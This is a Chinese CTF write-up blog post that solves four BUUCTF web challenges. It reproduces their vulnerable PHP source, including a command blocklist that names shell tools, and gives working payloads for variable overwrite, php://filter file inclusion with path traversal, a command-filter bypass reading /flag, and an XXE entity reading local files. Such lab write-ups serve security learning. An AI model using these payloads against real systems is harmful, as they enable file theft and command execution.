+<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>(一个做的很不错的前端)</p>
+<p>发现   ?message=   和界面最后的  dog</p>
+<p>审计源码，尝试sql、ssti，无果</p>
+<h2 id="git文件泄露-1"><a href="#git文件泄露-1" class="headerlink" title=".git文件泄露"></a>.git文件泄露</h2><p>GitHack    </p>
+<p>down 不下index.php 和 flag.php…(不知道为啥..还重装了两遍)</p>
+<h2 id="exit-输出一条消息并退出当前脚本"><a href="#exit-输出一条消息并退出当前脚本" class="headerlink" title="exit($) 输出一条消息并退出当前脚本"></a>exit($) 输出一条消息并退出当前脚本</h2><h2 id="php-变量覆盖"><a href="#php-变量覆盖" class="headerlink" title="php 变量覆盖"></a>php 变量覆盖</h2><p>—&gt; index.php</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php
+include &#39;flag.php&#39;;
+
+$yds = &quot;dog&quot;;
+$is = &quot;cat&quot;;
+$handsome = &#39;yds&#39;;
+
+foreach($_POST as $x =&gt; $y)&#123;        
+    $$x = $y;                        
+&#125;
+
+
+foreach($_GET as $x =&gt; $y)&#123;            
+    $$x = $$y;                        
+&#125;
+
+//get handsome=flag
+//$yds=$flag
+
+
+foreach($_GET as $x =&gt; $y)&#123;            
+    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;        //这个if绕不过去--&gt;无法输出$handsome--&gt;$handsome!=flag
+        exit($handsome);
+    &#125;
+&#125;
+
+if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;    //尝试变量yds---&gt;get flag---&gt;game over
+    exit($yds);
+&#125;
+
+if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;    //...get is=flag&amp;flag=flag
+    exit($is);
+&#125;
+
+echo &quot;the flag is: &quot;.$flag;
+</code></pre></div>
+<p>—&gt;flag.php</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php
+$flag = file_get_contents(&#39;/flag&#39;);
+</code></pre></div>
+<p>payload</p>
+<div class="hljs code-wrapper"><pre><code>?yds=flag
+//
+?is=flag&amp;flag=flag
+</code></pre></div>
+<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>选择按钮，展示图片，url–&gt;?category=</p>
+<p>猜测为include，尝试伪协议</p>
+<div class="hljs code-wrapper"><pre><code>php://filter/read=convert.base64-encode/resource=index.php
+</code></pre></div>
+<p>报错</p>
+<div class="hljs code-wrapper"><pre><code>php://filter/read=convert.base64-encode/resource=index
+</code></pre></div>
+<p>读到index，仅截取php部分</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php
+    $file = $_GET[&#39;category&#39;];
+
+    if(isset($file))
+    &#123;    
+        //判断woofers/meowers/index在$file中第一次出现的位置---&gt;尝试绕过strops/构造payload
+        if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
+                include ($file . &#39;.php&#39;);
+        &#125;
+        else&#123;
+            echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
+        &#125;
+    &#125;
+    ?&gt;
+</code></pre></div>
+<p>尝试读/flag、ls、eval…</p>
+<p>html下flag.php…</p>
+<h2 id="strpos-查找字符串在另一字符串中第一次出现的位置"><a href="#strpos-查找字符串在另一字符串中第一次出现的位置" class="headerlink" title="strpos() 查找字符串在另一字符串中第一次出现的位置"></a>strpos() 查找字符串在另一字符串中第一次出现的位置</h2><h2 id="路径拼接读当前目录语句-index-flag"><a href="#路径拼接读当前目录语句-index-flag" class="headerlink" title="路径拼接读当前目录语句 index/../flag"></a>路径拼接读当前目录语句 index/../flag</h2><p>payload</p>
+<div class="hljs code-wrapper"><pre><code>php://filter/read=convert.base64-encode/resource=index/../flag
+</code></pre></div>
+<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>url–&gt;index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</p>
+<p>TXpVek5UTTFNbVUzTURabE5qYz0<br>两次base64解码—&gt;十六进制转字符串—&gt;555.png</p>
+<p>同理<br>index.php<br>字符串转十六进制—&gt;两次base64编码—&gt;得到index.php的base64</p>
+<p>得到index.php源码</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header(&#39;content-type:text/html;charset=utf-8&#39;);
+$cmd = $_GET[&#39;cmd&#39;];
+if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
+    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
+$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));
+
+$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);
+if (preg_match(&quot;/flag/i&quot;, $file)) &#123;
+    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;
+    die(&quot;xixi～ no flag&quot;);
+&#125; else &#123;
+    $txt = base64_encode(file_get_contents($file));
+    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;
+    echo &quot;&lt;br&gt;&quot;;
+&#125;
+echo $cmd;
+echo &quot;&lt;br&gt;&quot;;
+if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;
+    echo(&quot;forbid ~&quot;);
+    echo &quot;&lt;br&gt;&quot;;
+&#125; else &#123;
+    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;
+        echo `$cmd`;
+    &#125; else &#123;
+        echo (&quot;md5 is funny ~&quot;);
+    &#125;
+&#125;
+?&gt;
+</code></pre></div>
+<p>md5真实碰撞，翻博客…</p>
+<h2 id="ls过滤用dir"><a href="#ls过滤用dir" class="headerlink" title="ls过滤用dir"></a>ls过滤用dir</h2><p>…才知道…</p>
+<p>dir 当前目录下无 flag</p>
+<p>dir+/</p>
+<p>根目录下flag</p>
+<h2 id="特殊字符的使用"><a href="#特殊字符的使用" class="headerlink" title="特殊字符的使用"></a>特殊字符的使用</h2><p>ca\t 后面的\t会成为 TAB 而绕过</p>
+<p>payload </p>
+<div class="hljs code-wrapper"><pre><code>ca\t+/flag
+</code></pre></div>
+<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><div class="hljs code-wrapper"><pre><code>function doLogin()&#123;
+var username = $(&quot;#username&quot;).val();
+var password = $(&quot;#password&quot;).val();
+if(username == &quot;&quot; || password == &quot;&quot;)&#123;
+    alert(&quot;Please enter the username and password!&quot;);
+    return;
+&#125;
+
+var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; 
+$.ajax(&#123;
+    type: &quot;POST&quot;,
+    url: &quot;doLogin.php&quot;,
+    contentType: &quot;application/xml;charset=utf-8&quot;,
+    data: data,
+    dataType: &quot;xml&quot;,
+    anysc: false,
+    success: function (result) &#123;
+        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
+        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;
+        if(code == &quot;0&quot;)&#123;
+            $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);
+        &#125;else if(code == &quot;1&quot;)&#123;
+            $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);
+        &#125;else&#123;
+            $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);
+        &#125;
+    &#125;,
+    error: function (XMLHttpRequest,textStatus,errorThrown) &#123;
+        $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);
+    &#125;
+&#125;); 
+&#125;
+</code></pre></div>
+<p>抓包…没见过…  </p>
+<div class="hljs code-wrapper"><pre><code>&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;
+</code></pre></div>
+<p>测试sql无回显，尝试xss， 无果</p>
+<p>—&gt;XXE—XML外部实体注入</p>
+<h2 id="XXE—XML外部实体注入"><a href="#XXE—XML外部实体注入" class="headerlink" title="XXE—XML外部实体注入"></a>XXE—XML外部实体注入</h2><p>XML文件在引用外部实体时候,可以沟通构造恶意内容,可以导致读取任意文件,命令执行和对内网的攻击,这就是XXE漏洞</p>
+<p>payload </p>
+<div class="hljs code-wrapper"><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE note [
+  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;
+  ]&gt;
+&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
+</code></pre></div>
+<p>解释payload</p>
+<div class="hljs code-wrapper"><pre><code>//先添加xml文件头：称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;yes&quot;?&gt;
+
+standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项
+
+按实体有无参分类，实体分为一般实体和参数实体，一般实体的声明：
+&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;
+引用一般实体的方法：&amp;实体名称;
+
+外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机
+
+因为将file:///flag命名为admin，所以下面用&amp;admin;
+</code></pre></div>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web-buu/">web buu</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/27/PHP-ways/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP-way</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/24/sql-ways/">
+                        <span class="hidden-mobile">sql-ways</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">苏ICP备2021015436号-1</a>
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
